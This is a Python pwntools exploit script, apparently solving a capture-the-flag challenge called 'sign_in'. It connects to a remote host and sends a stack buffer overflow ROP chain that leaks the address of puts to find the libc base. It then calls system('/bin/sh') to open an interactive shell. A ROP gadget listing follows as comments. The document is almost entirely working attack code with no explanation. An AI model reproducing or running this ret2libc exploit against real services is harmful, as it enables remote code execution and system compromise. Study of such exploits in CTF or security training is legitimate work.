from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])

# io=process("./sign_in")
io=remote("43.143.7.127",28649)
elf=ELF("./sign_in")
libc=ELF("./libc.so")


io.recvuntil(b"here~\n")
pop_rdi_ret=0x401283
vuln=0x4011db
ret=0x40101a
payload=cyclic(0x48)+p64(pop_rdi_ret)+p64(elf.got[b"puts"])+p64(elf.plt[b"puts"])+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("leak_addr:  "+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b"puts"]
print("libc_addr:  "+hex(libc_addr))
sys_addr=libc_addr+libc.sym[b"system"]
str_bin_sh=libc_addr+next(libc.search(b"/bin/sh"))

io.recvuntil(b"here~\n")
payload=cyclic(0x48)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
